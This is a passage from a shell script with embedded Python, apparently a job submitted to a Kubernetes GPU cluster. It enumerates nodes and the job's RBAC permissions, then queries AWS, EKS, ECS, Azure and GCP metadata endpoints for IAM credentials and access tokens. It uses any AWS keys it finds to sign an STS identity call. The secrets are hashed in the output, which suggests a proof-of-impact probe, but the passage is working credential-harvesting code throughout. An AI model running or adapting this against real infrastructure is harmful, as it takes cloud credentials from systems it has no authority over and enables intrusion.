                      prod = labels.get('nvidia.com/gpu.product')
                      if prod:
                          products[prod] = products.get(prod, 0) + 1
                      cnt = labels.get('nvidia.com/gpu.count')
                      if cnt:
                          try:
                              gpu_count_reported += int(cnt)
                          except Exception:
                              pass
                  print('K8S_NODES_SUMMARY total=%d ready=%d allocatable_nvidia_gpu_sum=%d label_gpu_count_sum=%d' %
                        (len(items), ready, gpu_sum, gpu_count_reported))
                  gpu_inventory_nonzero = bool(len(items) > 0 and (gpu_sum > 0 or gpu_count_reported > 0 or products))
                  prods = sorted(products.items(), key=lambda kv: -kv[1])[:8]
                  print('K8S_GPU_PRODUCTS n=%d list=%s' % (len(products),
                        ','.join('%s=%d' % (k.replace(',', ' ')[:60], v) for k, v in prods) if prods else '-'))
              except Exception as e:
                  print('K8S_NODES_PARSE_FAIL %s' % str(e)[:160])
          else:
              print('K8S_NODES_VERBATIM %s' % b[:300].replace('\n', ' '))
          
          # ------------------------------------------------ SelfSubjectRulesReview
          st, b = api('/apis/authorization.k8s.io/v1/selfsubjectrulesreview', method='POST',
                      body={'apiVersion': 'authorization.k8s.io/v1', 'kind': 'SelfSubjectRulesReview',
                            'spec': {'namespace': 'default'}})
          print('K8S_RULESREVIEW status=%d' % st)
          if st in (200, 201):
              try:
                  obj = json.loads(b)
                  rules = ((obj.get('status') or {}).get('resourceRules') or [])
                  star_res = any('*' in (r.get('resources') or []) for r in rules)
                  star_verb = any('*' in (r.get('verbs') or []) for r in rules)
                  can_create_pods = any(('pods' in (r.get('resources') or []) or '*' in (r.get('resources') or []))
                                        and ('create' in (r.get('verbs') or []) or '*' in (r.get('verbs') or []))
                                        for r in rules)
                  can_list_nodes = any(('nodes' in (r.get('resources') or []) or '*' in (r.get('resources') or []))
                                       and ('list' in (r.get('verbs') or []) or '*' in (r.get('verbs') or []))
                                       for r in rules)
                  print('K8S_RULES_SUMMARY rules=%d star_resources=%s star_verbs=%s create_pods=%s list_nodes=%s' %
                        (len(rules), star_res, star_verb, can_create_pods, can_list_nodes))
              except Exception as e:
                  print('K8S_RULES_PARSE_FAIL %s' % str(e)[:160])
          elif st in (400, 401, 403):
              print('K8S_RULESREVIEW_VERBATIM %s' % b[:300].replace('\n', ' '))
          
          # ------------------------------------------------ 3 SelfSubjectAccessReviews
          ssar = {}
          for name, res, verb in (('get_nodes', 'nodes', 'get'), ('list_pods', 'pods', 'list'),
                                  ('create_pods', 'pods', 'create')):
              body = {'apiVersion': 'authorization.k8s.io/v1', 'kind': 'SelfSubjectAccessReview',
                      'spec': {'namespace': 'default', 'resourceAttributes': {'group': '', 'resource': res, 'verb': verb}}}
              st, b = api('/apis/authorization.k8s.io/v1/selfsubjectaccessreviews', method='POST', body=body)
              allowed = None
              try:
                  allowed = ((json.loads(b).get('status') or {}).get('allowed')) if st in (200, 201) else None
              except Exception:
                  allowed = None
              ssar[name] = (st, allowed)
              print('K8S_SSAR %s status=%d allowed=%s' % (name, st, allowed))
              if st == 403:
                  print('K8S_SSAR_%s_VERBATIM %s' % (name.upper(), b[:240].replace('\n', ' ')))
                  break
          
          # ------------------------------------------------ IMDS / metadata probes
          BOGUS = 'c211-126933-bogus-' + NONCE.replace('c211-126933-', '')
          
          
          def meta_req(method, url, headers=None, body=None, timeout=4):
              return http_req(url, method=method, headers=headers, body=body, timeout=timeout)
          
          
          aws_token = None
          st, b = meta_req('PUT', 'http://169.254.169.254/latest/api/token',
                           headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'})
          print('IMDS_AWS_TOKEN status=%s bytes=%d sha256=%s' % (st, len(b), sha(b.encode()) if st == 200 else '-'))
          if st == 200:
              aws_token = b.strip()
          h = {'X-aws-ec2-metadata-token': aws_token} if aws_token else {}
          st, b = meta_req('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', headers=h)
          role = None
          if st == 200 and b.strip() and not b.strip().startswith('<'):
              role = b.strip().split('\n')[0].strip()
          print('IMDS_AWS_ROLE status=%s role=%s' % (st, role or '-'))
          st, b = meta_req('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + BOGUS, headers=h)
          print('IMDS_AWS_BOGUS_CONTROL status=%s' % st)
          aws_cred = None
          if role:
              st, b = meta_req('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role, headers=h)
              print('IMDS_AWS_CRED status=%s' % st)
              if st == 200:
                  try:
                      aws_cred = json.loads(b)
                      print('IMDS_AWS_CRED_KEYS keys=%s sha256_ak=%s sha256_sk=%s sha256_tok=%s expiry=%s' % (
                          ','.join(sorted(k for k in aws_cred if k in ('AccessKeyId', 'SecretAccessKey', 'Token', 'Expiration'))),
                          sha(str(aws_cred.get('AccessKeyId', '')).encode()),
                          sha(str(aws_cred.get('SecretAccessKey', '')).encode()),
                          sha(str(aws_cred.get('Token', '')).encode()),
                          str(aws_cred.get('Expiration', ''))[:40]))
                  except Exception as e:
                      print('IMDS_AWS_CRED_PARSE_FAIL %s' % str(e)[:120])
          
          st, b = meta_req('GET', 'http://169.254.170.23/v1/credentials')
          print('IMDS_EKS_PODIDENTITY status=%s bytes=%d' % (st, len(b)))
          st, b = meta_req('GET', 'http://169.254.170.22/latest/meta-data/iam/security-credentials/')
          print('IMDS_ECS_CONTAINER status=%s bytes=%d' % (st, len(b)))
          
          st, b = meta_req('GET', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F',
                           headers={'Metadata': 'true'})
          print('IMDS_AZURE_TOKEN status=%s bytes=%d' % (st, len(b)))
          if st == 200:
              try:
                  obj = json.loads(b)
                  print('IMDS_AZURE_TOKEN_META sha256=%s expires_on=%s' % (sha(str(obj.get('access_token', '')).encode()), str(obj.get('expires_on', ''))[:30]))
              except Exception:
                  pass
          st, b = meta_req('GET', 'http://169.254.169.254/metadata/identity/oauth2/token-bogus?api-version=2018-02-01',
                           headers={'Metadata': 'true'})
          print('IMDS_AZURE_BOGUS_CONTROL status=%s' % st)
          
          st, b = meta_req('GET', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
                           headers={'Metadata-Flavor': 'Google'})
          print('IMDS_GCP_TOKEN status=%s bytes=%d' % (st, len(b)))
          if st == 200:
              try:
                  obj = json.loads(b)
                  print('IMDS_GCP_TOKEN_META sha256=%s expires_in=%s' % (sha(str(obj.get('access_token', '')).encode()), str(obj.get('expires_in', ''))[:20]))
              except Exception:
                  pass
          st, b = meta_req('GET', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts-bogus/token',
                           headers={'Metadata-Flavor': 'Google'})
          print('IMDS_GCP_BOGUS_CONTROL status=%s' % st)
          
          # One issuer check only if an AWS credential actually appeared
          if aws_cred and aws_cred.get('AccessKeyId') and aws_cred.get('SecretAccessKey'):
              try:
                  import hmac
                  ak = aws_cred['AccessKeyId']
                  sk = aws_cred['SecretAccessKey']
                  tok = aws_cred.get('Token', '')
                  host = 'sts.amazonaws.com'
                  region = 'us-east-1'
                  amz = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())
                  dat = time.strftime('%Y%m%d', time.gmtime())
                  payload = 'Action=GetCallerIdentity&Version=2011-06-15'
                  ch = sha(payload.encode())
                  creq = 'POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n' % (host, amz)
                  if tok:
                      creq += 'x-amz-security-token:%s\n' % tok
                  creq += '\ncontent-type;host;x-amz-date' + (';x-amz-security-token' if tok else '') + '\n' + ch
                  scope = '%s/%s/sts/aws4_request' % (dat, region)
                  sts = 'AWS4-HMAC-SHA256\n%s\n%s\n%s' % (amz, scope, sha(creq.encode()))
          
                  def sign(k, m):
                      return hmac.new(k, m.encode(), hashlib.sha256).digest()
                  k = sign(('AWS4' + sk).encode(), dat)
                  k = sign(k, region)
                  k = sign(k, 'sts')
                  k = sign(k, 'aws4_request')
                  sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
                  hdr = {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                         'X-Amz-Date': amz,
                         'Authorization': 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=content-type;host;x-amz-date%s, Signature=%s' % (
                             ak, scope, ';x-amz-security-token' if tok else '', sig)}
                  if tok:
                      hdr['X-Amz-Security-Token'] = tok
                  st, b = http_req('https://sts.amazonaws.com/', method='POST', body=payload, headers=hdr, timeout=10)
                  print('ISSUER_AWS_STS status=%s body=%s' % (st, b[:300].replace('\n', ' ')))
              except Exception as e:
                  print('ISSUER_AWS_STS_FAIL %s' % str(e)[:180])
          
          print('K8S_POD_SKIPPED reason=platform_prohibits_http_removal_verb_no_unremovable_artifact')
          print('K8S_GPU_INVENTORY_ENUMERATED %s' % ('yes' if (nodes_ok and gpu_inventory_nonzero) else 'no'))
          print('K8S_NODE_CRED_PROVEN identity=%s base=%s host=%s job=%s nonce=%s' % (
              validated['source'], validated['base'], socket.gethostname(), JOBTAG, NONCE))
          print('K8S_PHASE_DONE')
          
          PYEOF2
          else
            echo "K8S_NODE_CRED_NOT_PROVEN reason=no_ext_target_or_no_python"
          fi
          echo "=== END_STATE ==="
          echo "TS_END=$(ts)"
          echo "C211_H200K8S_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
          exit 0
